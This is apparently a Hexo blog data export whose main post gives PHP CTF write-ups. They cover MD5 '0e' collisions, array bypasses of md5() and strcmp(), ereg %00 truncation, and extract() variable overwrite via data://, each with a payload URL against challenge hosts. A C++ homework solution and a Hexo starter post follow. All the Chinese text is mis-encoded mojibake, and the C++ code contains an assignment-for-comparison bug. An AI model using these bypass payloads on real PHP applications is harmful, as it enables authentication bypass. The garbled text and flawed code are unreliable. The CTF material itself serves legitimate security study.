å‚è€ƒç½‘ä¸Šèµ„æ–™ï¼šå½“ä¸€ä¸ªå­—ç¬¦ä¸²å½“ä½œä¸€ä¸ªæ•°å€¼æ¥å–å€¼ï¼Œå…¶ç»“æœå’Œç±»å‹å¦‚ä¸‹:å¦‚æœè¯¥å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å«â€™.â€™,â€™eâ€™,â€™Eâ€™å¹¶ä¸”å…¶æ•°å€¼å€¼åœ¨æ•´å½¢çš„èŒƒå›´ä¹‹å†…åˆ™ï¼šè¯¥å­—ç¬¦ä¸²è¢«å½“ä½œintæ¥å–å€¼ï¼Œå…¶ä»–æ‰€æœ‰æƒ…å†µä¸‹éƒ½è¢«ä½œä¸ºfloatæ¥å–å€¼ï¼Œè¯¥å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥æ‰¾ç¬¦åˆxexæ ¼å¼çš„MD5åŸå‚{MD5 ç®—æ³•è‡ªè¯ç”Ÿä¹‹æ—¥èµ·ï¼Œå°±æœ‰å¾ˆå¤šäººè¯•å›¾è¯æ˜å’Œå‘ç°å®ƒçš„ä¸å®‰å…¨ä¹‹å¤„ï¼Œå³å­˜åœ¨ç¢°æ’ï¼ˆåœ¨å¯¹ä¸¤ä¸ªä¸åŒçš„å†…å®¹ä½¿ç”¨ MD5ç®—æ³•è¿ç®—çš„æ—¶å€™ï¼Œæœ‰å¯èƒ½å¾—åˆ°ä¸€å¯¹ç›¸åŒçš„ç»“æœå€¼ï¼‰â€“ç™¾ç§‘}md5çš„ç¢°æ’ï¼Œåœ¨PHPçš„æ•°çš„å¤„ç†ä¸­ï¼Œç±»ä¼¼0å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆ0ï¼Œå› æ­¤æœ‰md5ç¢°æ’ã€‚ MD5å€¼(å“ˆå¸Œå€¼)ç›¸ç­‰çš„é—®é¢˜å¯ä»¥ç”¨å“ˆå¸Œå€¼ç¢°æ’ï¼Œä¹Ÿå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œå¦‚ï¼š 1`username[]=1&amp;password[]=2. è§£å†³ï¼šhttp://119.23.73.3:5001/web5/**?a=QNKCDZO&amp;b=s878926199a** ,ç›´æ¥å¾—åˆ°flagã€‚ 1md5('**QNKCDZO**')==md5('**s878926199a** ')---&gt;True Experiment 2.1é¢˜ç›®ç»™å‡ºäº†phpä»£ç ï¼š 12345678910111213&lt;?phperror_reporting(0);$flag = 'flag&#123;test&#125;';if (isset($_GET['username']) and isset($_GET['password'])) &#123;if ($_GET['username'] == $_GET['password'])print 'Your password can not be your username.';else if (md5($_GET['username']) === md5($_GET['password']))die('Flag: '.$flag);elseprint 'Invalid password';&#125;?&gt; åˆ†æä»£ç ï¼š1æˆ‘ä»¬å¾—æ„é€ $_GET[â€˜usernameâ€™]å’Œ$GET[â€˜passwordâ€™]çš„å€¼ä¸ç›¸ç­‰ï¼ŒåŒæ—¶å®ƒä»¬çš„md5çš„å€¼ç›¸ç­‰æ‰èƒ½å¾—åˆ°flag å› ä¸ºmd5ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œå¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼Œmd5(æ•°ç»„)ä¼šè¿”å›FALSEï¼Œusername[]=1,password[]=2è¿™æ ·å¼±==ä¸‹å¯ä»¥å®ç°username!=password,åŒæ—¶ä¼šå¾—åˆ°FALSE===FALSEä½¿å¾—md5(username)===md5(password)æˆç«‹ã€‚è§£å†³ï¼šhttp://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2 ç›´æ¥å¾—åˆ°flagã€‚ Experiment 3æ‰“å¼€é“¾æ¥å¾—åˆ°ï¼šç»†ç»†å“å‘³åå‘ç°â€œé“¾æ¥â€ä¸‹çœŸæœ‰ä¸€ä¸ªé“¾æ¥ã€‚ç‚¹å¼€å¾—åˆ°phpä»£ç ï¼š 123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123;$v1 = $_GET['v1'];$v2 = $_GET['v2'];$v3 = $_GET['v3'];if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;if(!strcmp($v3, $flag))&#123;echo $flag;&#125;&#125;&#125;?&gt; åˆ†æä»£ç ï¼šv1ä¸ç­‰äºv2åŒæ—¶ä¸¤è€…çš„MD5å€¼ç›¸ç­‰&lt;æ­¤å¤„æ—¢å¯ä»¥ç”¨MD5çš„0eæ¼æ´ä¹Ÿå¯ä»¥åˆ©ç”¨æ•°ç»„ç»•è¿‡&gt;ç”±if(!strcmp(v3,flag))éœ€è¦v3å’Œflagå€¼ç›¸åŒæ‰è¿”å›flagçš„å€¼ strcmpæ¼æ´int strcmp ( string str1,stringstr2 )str1æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œstr2æ˜¯ç¬¬äºŒä¸ªå­—ç¬¦ä¸²ã€‚å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1 å¤§äº str2 è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚ ä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥éå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®çš„æ—¶å€™ï¼Œè¿™ä¸ªå‡½æ•°å°†å‘ç”Ÿé”™è¯¯ï¼Œåœ¨5.3ä¹‹å‰çš„phpä¸­ï¼Œæ˜¾ç¤ºäº†æŠ¥é”™çš„è­¦å‘Šä¿¡æ¯åï¼Œå°†return 0 ! ä¹Ÿå°±æ˜¯è™½ç„¶æŠ¥äº†é”™ï¼Œä½†å´åˆ¤å®šå…¶ç›¸ç­‰äº†ã€‚ å› æ­¤ï¼Œè§£è¿™é“é¢˜ï¼Œå°±åªè¦ä¼ å…¥ä¸€ä¸ªéå­—ç¬¦ä¸²ç±»å‹çš„å˜é‡ä½¿å…¶æŠ¥é”™ï¼Œåˆç”±äºå‰é¢çš„å¦å®šâ€œï¼â€å¾—åˆ°trueã€‚è§£å†³ï¼šhttp://123.206.31.85:49162/?v1[]=1&amp;v2[]=2&amp;v3[]=1 Experiment 3.2æ‰“å¼€é“¾æ¥å¾—åˆ°ç©ºé¡µï¼Œæ ¹æ®ç»™å‡ºçš„phpä»£ç ï¼š 123456789&lt;?php$flag = \"flag&#123;xxxxx&#125;\";if (isset($_GET['a'])) &#123;if (strcmp($_GET['a'], $flag) == 0) die('Flag: '.$flag);elseprint 'No';&#125;?&gt; åˆ†æä»£ç ï¼š ç¬¬ä¸€è¡Œï¼Œflagå˜é‡è¢«è®¾ç½®ä¸ºflag{xxxxx}ã€‚è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬è¦æäº¤çš„flagï¼ŒçœŸå®è¿è¡Œçš„åç«¯ä¸­çš„flagå˜é‡æ‰æ˜¯çœŸçš„flagã€‚ ç¬¬äºŒè¡Œï¼Œissetå‡½æ•°åˆ¤æ–­HTTP GETè¯·æ±‚ä¸­çš„å‚æ•°aæ˜¯å¦å·²è®¾ç½®å¹¶ä¸”éNULLã€‚strcmpå‡½æ•°å°†aå‚æ•°ä¸flagç›¸æ¯”è¾ƒï¼Œå¦‚æœä¸€è‡´ï¼Œåˆ™è°ƒç”¨dieå‡½æ•°ã€‚dieå‡½æ•°çš„ä½œç”¨æ˜¯æ‰“å°dieå‡½æ•°çš„å‚æ•°ï¼Œå¹¶ç«‹å³åœæ­¢è¯¥phpåç«¯çš„è¿è¡Œã€‚é‚£ä¹ˆæˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯è¦è®©phpæ‰§è¡Œåˆ°dieå‡½æ•°ï¼Œæ˜¾ç¤ºflagã€‚æ ¹æ®ä¸Šé¢˜strcmpæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨æ•°ç»„ç»•è¿‡æ¯”å¦‚ç”¨â€a[]=â€è§£å†³ï¼šhttp://123.206.87.240:9009/6.php?a[]= eregæˆªæ–­æ‰“å¼€é“¾æ¥åŒæ ·æ˜¯ä¸€ä¸ªç©ºç™½é¡µé¢ï¼Œæ ¹æ®ç»™å‡ºçš„phpä»£ç ï¼š 1234567891011&lt;?php$flag = \"flag\";if (isset ($_GET['password'])) &#123;if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)echo 'You password must be alphanumeric';else if (strpos ($_GET['password'], '--') !== FALSE)die('Flag: ' . $flag);elseecho 'Invalid password';&#125;?&gt; åˆ†æä»£ç ï¼šflagå˜é‡è¢«è®¾ç½®ä¸ºflagï¼Œå³æœ€ç»ˆæˆ‘ä»¬éœ€è¦å¾—åˆ°flagå˜é‡çš„å†…å®¹ä»è€Œè¾¾åˆ°çœŸæ­£çš„flagã€‚issetå‡½æ•°åˆ¤æ–­HTTP GETè¯·æ±‚ä¸­çš„å‚æ•°passwordæ˜¯å¦å·²è®¾ç½®å¹¶ä¸”éNULL ereg()å‡½æ•° 1234567&#123; ereg ( string $pattern , string $string [, array &amp;$regs ] ) : intå‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­—æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚&#125;ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) !== FALSEç”±ç¬¬ä¸€ä¸ªå‚æ•°æ­£åˆ™è¡¨è¾¾å¼å¯çŸ¥è¯¥å­—ç¬¦ä¸²ä»å¤´åˆ°å°¾åªå…è®¸å‡ºç°å­—æ¯ä¸æ•°å­—å³a-zã€A-Zã€0-9. strpos()å‡½æ•°123456&#123; strpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) : intæŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚&#125;strpos ($_GET['password'], '--') !== FALSEè¯¥å­—ç¬¦ä¸²å¿…é¡»æœ‰â€œ*--*â€å­—ç¬¦ã€‚ è¿™ä¸¤ä¸ªæ¡ä»¶æ˜æ˜¾å‘ç”Ÿå†²çªï¼Œç”±äºereg()å‡½æ•°å­˜åœ¨%00æˆªæ–­ï¼Œå³ereg()è¯»å–å­—ç¬¦ä¸²æ—¶ï¼Œå½“é‡åˆ°%00ä¼šé»˜è®¤å·²ç»è¯»å®Œï¼Œä¸å†è¯»å–åé¢çš„å†…å®¹ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨%00åæ·»åŠ â€œâ€“â€ä»è€Œç»•è¿‡æ­£åˆ™æ£€æµ‹ã€‚ è§£å†³ï¼šhttp://123.206.87.240:9009/19.php?password=12%00--åŒæ—¶ï¼Œereg()åªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œé‡åˆ°æ•°ç»„åšå‚æ•°è¿”å›NULLï¼Œæ¡ä»¶ç”¨å¼º === ï¼ˆè¦æ±‚ä¸¤è¾¹ç±»å‹ç›¸åŒï¼‰ï¼Œè€ŒNULLè·ŸFALSEç±»å‹ä¸åŒ,é¡ºåˆ©è¿›å…¥ä¸‹ä¸€ä¸ªæ¡ä»¶ï¼›strpos()çš„å‚æ•°ä¹Ÿä¸èƒ½ä¸ºæ•°ç»„ï¼Œå¦åˆ™è¿”å›NULLï¼Œä¸FALSEç±»å‹ä¸åŒï¼Œæ»¡è¶³ï¼==æ¡ä»¶ï¼Œæ•…ä¹Ÿå¯ä»¥ç›´æ¥ä¼ å…¥ä¸€ä¸ªæ•°ç»„ã€‚è§£å†³ï¼šhttp://123.206.87.240:9009/19.php?password[]=ï¼ˆæˆ–http://123.206.87.240:9009/19.php?password[]=1åªæ˜¯ä¸€ä¸ªä¸ºç©ºå€¼ä¸€ä¸ªç»™äº†ä¸ªå€¼ã€‚ï¼‰ Extractæ‰“å¼€é“¾æ¥ç©ºç™½é¡µé¢ï¼Œåˆ†æç»™å‡ºçš„phpä»£ç ï¼š 12345678910&lt;?php$flag='xxx';extract($_GET); if(isset($shiyan))&#123; $content=trim(file_get_contents($flag)); if($shiyan==$content)&#123;echo'flag&#123;xxx&#125;'; &#125; else &#123; echo'Oh.no'; &#125; &#125;?&gt; extract()å‡½æ•°{extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚è¯¥å‡½æ•°è¿”å›æˆåŠŸè®¾ç½®çš„å˜é‡æ•°ç›®ã€‚ä½†æ˜¯å½“å˜é‡ä¸­æœ‰åŒåçš„å…ƒç´ æ—¶ï¼Œè¯¥å‡½æ•°é»˜è®¤å°†åŸæœ‰çš„å€¼ç»™è¦†ç›–æ‰ï¼Œè¿™å°±é€ æˆäº†å˜é‡è¦†ç›–æ¼æ´ã€‚} ä»£ç åˆ†æï¼šå°†flagå˜é‡è®¾ç½®ä¸ºxxxï¼›å°†GET æ–¹æ³•ä¼ è¾“è¿›æ¥çš„å€¼é€šè¿‡extract()å‡½æ•°å¤„ç†ï¼›issetå‡½æ•°åˆ¤æ–­HTTP GETè¯·æ±‚ä¸­çš„å‚æ•°shiyanæ˜¯å¦å·²è®¾ç½®å¹¶ä¸”éNULL;if åˆ¤æ–­shiyanè¿™ä¸ªå˜é‡å’Œcontentè¿™ä¸ªå˜é‡æ˜¯å¦ç›¸ç­‰ã€‚content çš„å€¼æ˜¯é€šè¿‡è¯»å– flag å˜é‡çš„å€¼æ¥è·å–çš„ã€‚å¦‚æœè¿™ä¸ªä¸¤ä¸ªå˜é‡ç›¸ç­‰è¾“å‡º flag ã€‚file_get_contents() â€” å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚trim() â€” å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰ã€‚è§£å†³ï¼šç”±äºæˆ‘ä»¬ä¸çŸ¥é“flagçš„å€¼æ˜¯ä»€ä¹ˆï¼Ÿæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ©ç”¨extract()å‡½æ•°æ¼æ´ï¼Œè¿›è¡Œå˜é‡è¦†ç›–ï¼Œé‡æ–°ç»™flagå˜é‡èµ‹å€¼ã€‚åªè¦æˆ‘ä»¬æ„é€ çš„payloadä½¿å¾— $shiyan = $content ï¼Œå…¶ä¸­ $content çš„å€¼åˆå–å†³äº flag å˜é‡ï¼Œæ‰€ä»¥åªè¦ shiyanå˜é‡ç›¸ç­‰äºflagå˜é‡å³å¯ã€‚ç”±äºfile_get_contents($flag) ä¸­çš„$flagæ˜¯ä¸€ä¸ªå‚æ•°ï¼Œå¯¼è‡´$contentçš„å€¼æ˜¯ç©ºå€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹payloadï¼šhttp://123.206.87.240:9009/1.php?shiyan= è¿™é‡Œå†å¼•ä¸€ä½å¤§ä½¬çš„è§£ç­”ï¼šï¼ˆä»£ç ç¨æœ‰ä¸åŒï¼‰https://zhouxinan.github.io/ 123456789101112&lt;?php$flag='xxx';extract($_GET);if(isset($sixstars)) &#123; $content=trim(file_get_contents($flag)); if ($sixstars==$content) &#123; echo 'flag&#123;xxx&#125;'; &#125; else &#123; echo 'Oh.no'; &#125;&#125;?&gt; é¦–å…ˆï¼Œflagå˜é‡è¢«è®¾ç½®ä¸ºâ€™xxxâ€™ï¼Œä¸€ä¸ªç®€å•çš„å­—ç¬¦ä¸²ã€‚æ¥ç€ï¼Œåç«¯è¿è¡Œäº†extractå‡½æ•°ï¼Œä»$_GETæ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿå…¶å®å¾ˆç®€å•ã€‚æ¯”å¦‚å¦‚æœæˆ‘ä»¬è®¿é—®äº†http://139.224.220.67:23900/dmsj/level2/?sixstars=1ï¼Œé‚£ä¹ˆ`$_GET[&quot;sixstars&quot;]`çš„å€¼ä¸ºå­—ç¬¦ä¸²1ã€‚æ‰§è¡Œ`extract($_GET)`;æ—¶ï¼Œå°±ç›¸å½“äºæ‰§è¡Œäº†`$sixstars=&#39;1&#39;`ã€‚ç„¶åï¼Œç¨‹åºå°†ä¼šæ‰§è¡Œisset($sixstars)ã€‚æˆ‘ä»¬çœ‹åˆ°ï¼Œä¸ºäº†è·å–flagï¼Œå¿…é¡»æ‰§è¡Œåˆ°echo â€˜flag{xxx}â€™;ï¼Œæ‰€ä»¥isset($sixstars)çš„è¿”å›å€¼å¿…é¡»ä¸º TRUEã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¿…é¡»é€šè¿‡extract($_GET);å°†sixstarså˜é‡è®¾ç½®ä¸ºä»»æ„å€¼ï¼Œå³ä½¿æ˜¯ç©ºå­—ç¬¦ä¸²ä¹Ÿå¯ä»¥ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿è®¿é—®http://139.224.220.67:23900/dmsj/level2/?sixstars=ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ä½†ç»å¯¹ä¸èƒ½ä¸åŒ…å«sixstarså‚æ•°ã€‚æ¥ç€ï¼Œç¨‹åºå°†ä¼šæ‰§è¡Œ$content=trim(file_get_contents($flag));ã€‚æˆ‘ä»¬åˆ†æ­¥çœ‹ã€‚é¦–å…ˆä¼šæ‰§è¡Œfile_get_contents($flag)ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœä½ ä¸é€šè¿‡URLä¼ å…¥flagå‚æ•°ï¼Œé‚£ä¹ˆï¼Œå› ä¸ºç¨‹åºçš„æœ€å¼€å§‹å·²ç»æ‰§è¡Œè¿‡$flag=&#39;xxx&#39;;ï¼Œæ‰€ä»¥åˆ°äº†è¿™é‡Œå°†ä¼šæ‰§è¡Œfile_get_contents(â€˜xxxâ€™)ã€‚file_get_contentså‡½æ•°å¯ä»¥â€œå°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²â€ã€‚æ¯”å¦‚å¦‚ä¸‹ä»£ç å¯ä»¥å°†http://www.example.com/ç½‘ç«™çš„æºä»£ç è¯»å–åˆ°homepageå˜é‡ä¸­å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚ 1234&lt;?php$homepage = file_get_contents('http://www.example.com/');echo $homepage;?&gt; æ¥ç€ï¼Œphpåˆä¼šæ‰§è¡Œtrimå‡½æ•°ï¼Œå®ƒå°†ä¼šâ€œå»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰â€ã€‚æœ€åï¼Œphpå°†ä¼šæ‰§è¡Œif ($sixstars==$content)ï¼Œå¦‚æœä¸ºTRUEï¼Œé‚£ä¹ˆå°†ä¼šæ˜¾ç¤ºflagã€‚è¯»åˆ°è¿™é‡Œï¼Œä½ æƒ³å¿…å·²ç»çŸ¥é“äº†æˆ‘ä»¬è¯¥æ€ä¹ˆåšï¼šé¦–å…ˆï¼Œç»™sixstarså˜é‡ä¼ å…¥ä¸€ä¸ªå€¼ï¼Œæ¯”å¦‚1ã€‚ç„¶åï¼Œç»™flagå˜é‡ä¼ å…¥ä¸€ä¸ªæˆ‘ä»¬èƒ½æ§åˆ¶çš„ç½‘ç«™çš„åœ°å€ï¼Œå¹¶è®©è¿™ä¸ªæˆ‘ä»¬èƒ½æ§åˆ¶çš„ç½‘ç«™çš„æºä»£ç è®¾ç½®ä¸º1ã€‚ç”±äºextractèƒ½èµ·åˆ°â€œå˜é‡è¦†ç›–â€çš„ä½œç”¨ï¼Œåœ¨extractåï¼Œflagå˜é‡å°±ä¼šè¢«è¦†ç›–ä¸ºæˆ‘ä»¬èƒ½æ§åˆ¶çš„ç½‘ç«™çš„åœ°å€ï¼Œè€Œä¸å†æ˜¯â€™xxxâ€™ï¼Œè¿™æ ·å½“æ‰§è¡Œåˆ°file_get_contentsæ—¶phpåç«¯å°†ä¼šä»æˆ‘ä»¬èƒ½æ§åˆ¶çš„ç½‘ç«™ä¸Šè¯»å–åˆ°1ï¼Œå¹¶å°†å…¶å’Œsixstarså˜é‡æ¯”è¾ƒï¼Œå¹¶è¿”å›TRUEï¼Œç„¶åå°±èƒ½æ‰“å°flagã€‚è™½ç„¶è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯ä»Šå¤©æˆ‘è¦æ•™ä½ ä¸€ä¸ªæ›´ç®€å•çš„æ–¹æ³•ï¼Œé‚£å°±æ˜¯phpä¼ªåè®®ã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥ç»™flagå˜é‡ä¼ å…¥data://text/plain,1ã€‚æ„æ€æ˜¯æ˜æ–‡1ã€‚è¿™æ ·file_get_contents(â€˜data://text/plain,1â€™)å°†ä¼šç›´æ¥è¿”å›1ï¼Œå°±ä¸éœ€è¦æˆ‘ä»¬åœ¨å…¬ç½‘ä¸Šå¼€ä¸€å°æœåŠ¡å™¨äº†ã€‚æ‰€ä»¥ï¼Œæœ€åæˆ‘ä»¬çš„payloadæ˜¯ï¼š1 http://139.224.220.67:23900/dmsj/level2/?sixstars=1&amp;flag=data://text/plain,1è¿™é‡Œå†å¼ºè°ƒä¸€ä¸‹ï¼Œç»™åç«¯ä¼ å‚çš„æ–¹æ³•æ˜¯ï¼šåœ¨?åè·Ÿå˜é‡åå­—ï¼Œä¸åŒçš„å˜é‡ä¹‹é—´ç”¨&amp;éš”å¼€ã€‚","categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://singlemindedt.github.io/categories/ä»£ç å®¡è®¡/"},{"name":"php","slug":"ä»£ç å®¡è®¡/php","permalink":"https://singlemindedt.github.io/categories/ä»£ç å®¡è®¡/php/"}],"tags":[{"name":"php","slug":"php","permalink":"https://singlemindedt.github.io/tags/php/"}]},{"title":"åŠ å¯†ç®—æ³•","slug":"åŠ å¯†ç®—æ³•","date":"2019-09-01T14:50:25.000Z","updated":"2019-09-01T14:50:25.208Z","comments":true,"path":"2019/09/01/åŠ å¯†ç®—æ³•/","link":"","permalink":"https://singlemindedt.github.io/2019/09/01/åŠ å¯†ç®—æ³•/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","date":"2019-09-01T14:49:34.000Z","updated":"2019-09-01T14:49:35.039Z","comments":true,"path":"2019/09/01/ååºåˆ—åŒ–/","link":"","permalink":"https://singlemindedt.github.io/2019/09/01/ååºåˆ—åŒ–/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"å°é›é¸Ÿçš„æˆäººå¼2","slug":"ç®—æ³•ä½œä¸šone","date":"2019-09-01T09:37:45.000Z","updated":"2019-09-05T14:24:01.539Z","comments":true,"path":"2019/09/01/ç®—æ³•ä½œä¸šone/","link":"","permalink":"https://singlemindedt.github.io/2019/09/01/ç®—æ³•ä½œä¸šone/","excerpt":"","text":"é¢˜ç›®æè¿°é™¶è¡ŒçŸ¥å…ˆç”Ÿè¯´ï¼šâ€œæˆ‘ä»¬è¦æ´»çš„ä¹¦ï¼Œä¸è¦æ­»çš„ä¹¦ â€ã€‚ å°é›é¸Ÿä»¬ä»ä¹¦ä¸Šéƒ½æ˜¯å¯¹çš„åˆ°ç°åœ¨èƒ½å»ä¼ªå­˜çœŸçš„å»ä½¿ç”¨ä¹¦ç±ï¼Œè¯æ˜ä½ ä»¬é•¿å¤§äº†ã€‚æ€»ä¹‹å°±æ˜¯è¦æœ‰è‡ªå·±çš„ä¸»è§ï¼Œè‡ªå·±çš„æ€è€ƒã€‚ å¤§ç™½å¸Œæœ›å¤§å®¶éƒ½èƒ½æ‹¿åˆ°ä¸€ç™¾åˆ†ï¼Œæ‰€ä»¥å¯¹100è¿™ä¸ªæ•°ä»¥åŠä»–çš„å€æ•°å¾ˆå–œæ¬¢ã€‚ å¤§ç™½å‘ç°ï¼Œä»1å¼€å§‹ï¼Œä¸€å®šèƒ½æ‰¾å‡ºä¸€ä¸ªåºåˆ—ä»å°åˆ°å¤§æ’åˆ—ï¼Œä½¿å¾—æ¯ä¸€é¡¹éƒ½æ˜¯ æ°å¥½èƒ½ä¸”ä»…èƒ½ è¢«100æ•´é™¤Dæ¬¡ã€‚ è¯·ä½ ç¼–å†™ç¨‹åºï¼Œæ‰¾åˆ°è¿™ä¸ªæ•°åˆ—é‡Œç¬¬Nä¸ªæ•°ã€‚ è¾“å…¥å¤šè¡Œã€‚æ¯è¡Œè¾“å…¥ä¸¤ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºDå’ŒNï¼ŒNèŒƒå›´[1,100]ï¼ŒDèŒƒå›´[0,2] è¾“å‡ºæ¯è¡Œå¯¹åº”è¾“å…¥ï¼Œç»™å‡ºä¸€ä¸ªç¬¦åˆé¢˜æ„çš„æ•´æ•° æ ·ä¾‹è¾“å…¥1230 51 112 85 æ ·ä¾‹è¾“å‡º12351100850000 æç¤º###æ€è·¯ï¼šå¾ˆå®¹æ˜“æƒ³åˆ°è®¡ç®—æ–¹æ³•ï¼Œå…¶ä¸­N=100çš„æƒ…å†µéœ€è¦æ³¨æ„ï¼Œåœ¨ä¸‹é¢å¸¦ä»£ç ä¸­ç»™å‡ºã€‚ é¢˜è§£ï¼š12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include&lt;math.h&gt;using namespace std;int main()&#123; double D,N;//pow(double,double) double n; //é¿å…æŸå¤±ç²¾åº¦ //int s;//æœ€åç”±äºè¦å¾—åˆ°æ•´æ•°è€Œéç§‘å­¦è®°æ•°æ³•ï¼Œæ•…éœ€è¦å¼ºåˆ¶è½¬æ¢ä¸€ä¸‹ //å¦‚ï¼š2 100 å¾—åˆ°1.01e+006è½¬åŒ–ä¹‹åä¸º1010000 //***ä¹Ÿå¯ä»¥ç›´æ¥cout&lt;&lt;int(n)è½¬åŒ–è¾“å‡ºç»“æœ while(cin&gt;&gt;D&gt;&gt;N) &#123; if(1&lt;=N&amp;&amp;N&lt;100&amp;&amp;0&lt;=D&amp;&amp;D&lt;=2) &#123; n=N*(pow(100,D)); //s=n; cout&lt;&lt;int(n)&lt;&lt;endl; &#125; else if(N=100&amp;&amp;0&lt;=D&amp;&amp;D&lt;=2)//å½“N=100ç”¨åŸæ¥çš„ç®—æ³•ä¼šä½¿ç»“æœæ•´é™¤æ¬¡æ•°åŠ 1 &#123; n=101*(pow(100,D)); //s=n; cout&lt;&lt;int(n)&lt;&lt;endl; &#125; else continue; &#125; return 0;&#125;","categories":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://singlemindedt.github.io/categories/ç®—æ³•/"}],"tags":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://singlemindedt.github.io/tags/ç®—æ³•/"}]},{"title":"Hello World","slug":"hello-world","date":"2019-08-30T16:00:00.000Z","updated":"2019-09-05T14:30:35.937Z","comments":true,"path":"2019/08/31/hello-world/","link":"","permalink":"https://singlemindedt.github.io/2019/08/31/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://singlemindedt.github.io/tags/Hexo/"}]}]}